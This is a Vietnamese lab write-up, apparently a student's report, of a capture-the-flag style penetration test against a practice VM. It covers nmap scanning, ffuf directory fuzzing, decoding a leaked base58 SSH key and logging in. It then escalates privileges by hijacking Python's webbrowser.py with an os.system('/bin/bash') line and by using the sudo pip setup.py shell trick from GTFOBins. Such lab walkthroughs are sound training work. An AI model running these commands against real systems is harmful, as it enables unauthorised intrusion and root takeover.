# LAB6

## Dùng phương pháp pentest
### Chuẩn bị
* kali linux: 192.168.8.150  
![Screenshot from 2023-03-02 14-30-52](https://user-images.githubusercontent.com/91528234/222362989-3bfca71f-6c17-449c-a699-a36841eea54c.png)
* Debian: 192.168.18.36  
![Screenshot from 2023-03-02 14-31-19](https://user-images.githubusercontent.com/91528234/222362917-50666c3a-b476-4692-836a-30433d80e264.png)

### Quét mạng

* Để bắt đầu, chúng ta phải sử dụng lệnh netdetect để quét mạng để tìm địa chỉ IP của máy nạn nhân.

* Để tiếp tục quá trình này, chúng tôi sẽ khởi chạy Nmap.
```
nmap -sC -sV 192.168.18.36
```
* Trong đó:
  * -sC: chạy các kịch bản script được tích hợp sẵn để quét port và thu thập thông tin hệ thống. Cờ này tương đương với việc sử dụng tất cả các kịch bản script có sẵn.

  * -sV: quét phiên bản dịch vụ của các port mở. Nó sẽ cố gắng xác định phiên bản của các dịch vụ được chạy trên các cổng mạng bằng cách truy vấn các cơ sở dữ liệu phiên bản dịch vụ được lưu trữ trong nmap.
 ![image](https://user-images.githubusercontent.com/91528234/222363730-031c97ed-20e7-4e64-9d8e-3915a108d83b.png)
 * Chúng tôi có, theo đầu ra nmap:

* trên cổng 22 có máy chủ SSH.

* một dịch vụ HTTP (Apache Server) chạy trên cổng 80, cũng như một `/~myfiles`
### liệt kê

* Chúng ta bắt đầu quy trình liệt kê bằng cách kiểm tra trang HTTP (/~myfiles). Đã phát hiện ra Lỗi 404 có vẻ đáng ngờ.
```
http://192.168.18.36/~myfiles/
```
![image](https://user-images.githubusercontent.com/91528234/222364938-7665cd4a-6821-47f8-ace0-96ada0193b95.png)
* Chúng tôi đã xem mã nguồn của trang xem và tìm thấy nhận xét “you can do it, keep trying(bạn có thể làm được, hãy tiếp tục cố gắng)”.
![image](https://user-images.githubusercontent.com/91528234/222365447-0382b3e6-e71e-41ce-9ee7-a34f8e5a712f.png)
* Trước tiên clone github `seclists`
```
git clone https://github.com/danielmiessler/SecLists.git 
```
![image](https://user-images.githubusercontent.com/91528234/222370860-8d89c9b8-1598-4824-9e8c-e703b9da08e3.png)
* Do đó, chúng tôi sử dụng fuzzing để thu được một số thông tin bổ sung từ trường hợp này. Chúng tôi đã sử dụng **ffuf** và chúng tôi có được một thư mục (**bí mật**).


```

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.18.36/~FUZZ'
```
![image](https://user-images.githubusercontent.com/91528234/222374260-2ae8de19-eb0b-4f93-8549-dfda2d5358ec.png)
* Hãy xem kỹ thư mục bí mật đó và phân tích rằng ở đây tác giả đang chia sẻ một số thông tin liên quan đến tệp khóa riêng SSH liên quan đến người dùng “icex64” mà chúng ta cần fuzz.
![image](https://user-images.githubusercontent.com/91528234/222374525-0e621af4-f5dd-4cd9-8baa-aea60273b92c.png)
* Để tìm khóa ssh riêng bí mật đó, chúng tôi lại sử dụng fuzzing với sự trợ giúp của ffuf một lần nữa và tìm thấy tệp văn bản (mysecret.txt).
![image](https://user-images.githubusercontent.com/91528234/222375326-d7ccc033-58a8-4f2a-94dc-33e64f7989ec.png)
* Chúng ta khám phá `mysecret.txt` bằng trình duyệt web. Nó dường như là một khóa ssh riêng, nhưng nó được mã hóa. Chúng tôi đã kiểm tra kỹ lưỡng khóa này và phát hiện ra rằng nó được mã hóa ở cơ số 58.
```
http://192.168.18.36/~secret/.mysecret.txt
```
![image](https://user-images.githubusercontent.com/91528234/222375747-b548ef01-0900-468d-b8fb-23ef7c128800.png)
* Chúng tôi đã tra cứu trực tuyến bộ giải mã cơ sở 58 và gặp phải trình duyệt. Đây là bộ giải mã base-58 trực tuyến cơ bản nhất dành cho các nhà phát triển và lập trình viên web.

* Chỉ cần nhập dữ liệu của bạn vào biểu mẫu bên dưới, nhấp vào nút Giải mã Base-58 và bạn sẽ thấy một chuỗi được mã hóa base-58. Chúng tôi đã nhận được khóa ssh của mình sau khi giải mã nó.
* Minh sử dụng `https://codebeautify.org/base58-decode` để giải mã
![image](https://user-images.githubusercontent.com/91528234/222376333-f9dad299-871b-474d-9b3e-d29424edf52d.png)

# Do có chút sự cố nên mình phải đổi máy nên ip thay đổi là kali `172.16.203.129` và máy nạn nhân là `172.16.203.130`
* Sau khi có mật khẩu là (P@55w0rd!) ta ssh vào server
![image](https://user-images.githubusercontent.com/91528234/222968308-13340028-8d19-4ddb-841c-e0bcbe2c2e2f.png)

* Bang!! Chúng tôi đã sử dụng người dùng icex64 để kết nối với ssh. Chúng tôi đã nhanh chóng xác minh quyền truy cập của người dùng này và phát hiện ra rằng một tệp Python đang chạy. Chúng tôi đã nhanh chóng kiểm tra tệp đó và phát hiện ra rằng nó có thể bị khai thác bằng cách sử dụng phương pháp Chiếm quyền điều khiển thư viện Python.
```
sudo -l
cat /home/arsene/heist.py
```
![image](https://user-images.githubusercontent.com/91528234/222968367-fe87a10c-c801-491d-8174-5657057a74e9.png)

### Nâng cấp đặc quyền
* Chúng tôi đã bắt đầu quá trình leo thang đặc quyền. Để bắt đầu với kỹ thuật Chiếm đoạt thư viện Python, trước tiên chúng ta phải xác định tọa độ của webbrowser.py. Đó là lý do tại sao chúng tôi đang sử dụng tập lệnh linpeas.

* Trước đây chúng tôi đã tải xuống tập lệnh Linpeas từ trang [git.](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) Bây giờ chúng ta chỉ cần điều hướng đến thư mục đó và khởi chạy một máy chủ http Python cơ bản.

```
python -m http.server 80
```
![image](https://user-images.githubusercontent.com/91528234/222968733-54f90011-fba4-4406-bbdd-1598504fc0e5.png)
* Bây giờ chúng ta sẽ chuyển sang thiết bị đầu cuối icex64. Chúng tôi đã chuyển thư mục sang thư mục `/tmp` và nhập tập lệnh Linpeas từ Kali Linux bằng hàm wget
![image](https://user-images.githubusercontent.com/91528234/222969349-90b7b329-7ac4-46c8-8a98-9339c2b9f372.png)
* Sau đó, chúng tôi đã cấp cho tập lệnh TẤT CẢ các quyền. Sau đó, chúng tôi chạy nó ngay lập tức.
```
chmod 777 linpeas.sh
./linpeas.sh
```
![image](https://user-images.githubusercontent.com/91528234/222969462-2beadcb3-7124-4e73-8b4f-2f5bee1f9ccb.png)
* Chúng tôi đã có được vị trí của tệp Python chỉ trong vài giây (webbrowser.py).
 ![image](https://user-images.githubusercontent.com/91528234/222969521-a4985ced-1c78-461a-a357-568030fc78a1.png)
* Bây giờ chúng ta có thể bắt đầu quy trình Chiếm quyền điều khiển thư viện Python khi kẻ tấn công được đưa vào môi trường hỗ trợ python, bạn có thể tìm hiểu thêm về chiến lược này bằng cách nhấp vào đây.

* Để vận hành tệp python này, chúng tôi đã sử dụng lệnh `vi` và chỉnh sửa tập lệnh để gọi mã /bin/bash vào đó.

```
os.system ("/bin/bash")
```

![image](https://user-images.githubusercontent.com/91528234/222969614-d5febe8f-2325-463c-9840-0bdbaa84395d.png)
* Sau tất cả nỗ lực này, chúng tôi đã chạy lệnh sudo kết hợp với tọa độ được chỉ định trong kiểm tra quyền trên icex64. Để chuyển người dùng icex64 sang arsene.
```
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
* Chúng tôi đã nhận được người dùng arsene và đã kiểm tra quyền SUDO của người dùng này và nhận thấy người dùng có đặc quyền thực thi nhị phân pip với quyền root mà không cần xác thực. Chúng tôi có một ý tưởng để thực hiện leo thang đặc quyền pip sau khi đánh giá thêm một vài khoảnh khắc
```
sudo -l
```
![image](https://user-images.githubusercontent.com/91528234/222969693-f6409e06-4ad2-42ce-a1ed-e39c435ca28d.png)
* Chúng tôi đã sử dụng hướng dẫn gtfobin được cung cấp tại đây để tiến hành leo thang đặc quyền pip. Nếu chương trình được sudo cho phép chạy với tư cách siêu người dùng, thì chương trình sẽ giữ lại các quyền đã nâng cao của mình và có thể được sử dụng để truy cập hệ thống tệp, chuyển cấp hoặc giữ quyền truy cập đặc quyền.

* Để tiến hành leo thang đặc quyền pip, chúng ta chỉ cần chạy ba lệnh này.
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
* Cuối cùng, chúng ta có gốc; chỉ cần sử dụng lệnh id để kiểm tra. Nó đã được chứng minh rằng nó là gốc rễ; chỉ cần thay đổi thư mục thành root. Công-gô!! Chúng tôi đã lấy được cờ gốc.
![image](https://user-images.githubusercontent.com/91528234/222969811-1f59d93c-0b11-48ff-99a8-60390efedd80.png)

